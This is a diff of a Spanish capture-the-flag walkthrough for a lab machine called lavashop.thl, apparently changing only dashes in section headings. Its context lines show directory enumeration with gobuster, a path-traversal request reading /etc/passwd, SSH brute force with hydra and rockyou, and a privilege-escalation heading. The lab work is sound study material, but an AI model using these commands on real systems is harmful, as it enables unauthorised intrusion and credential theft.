@@ -94,7 +94,7 @@ gobuster dir -u http://lavashop.thl/pages -w /usr/share/wordlists/dirbuster/dire
 
 Archivos de interés: `about.php`, `contact.php`, `products.php` y `home.php`
 
-## 4. Explotación — LFI Manual
+## 4. Explotación - LFI Manual
 
 ### 4.1 Intentos fallidos sobre index.php
 
@@ -136,7 +136,7 @@ curl "http://lavashop.thl/pages/products.php?file=../../../../etc/passwd" | grep
 
 → Revela usuarios `debian` (UID 1000) y `Rodri` (UID 1001), ambos con shell /bin/bash y login interactivo
 
-## 5. Acceso Inicial — Fuerza Bruta SSH
+## 5. Acceso Inicial - Fuerza Bruta SSH
 
 ```bash
 hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP>
@@ -156,7 +156,7 @@ hydra -l debian -P /usr/share/wordlists/rockyou.txt ssh://<IP>
 ssh debian@<IP>
 ```
 
-## 6. Escalada de privilegios — GDBServer
+## 6. Escalada de privilegios - GDBServer
 
 ### 6.1 Enumeración
 
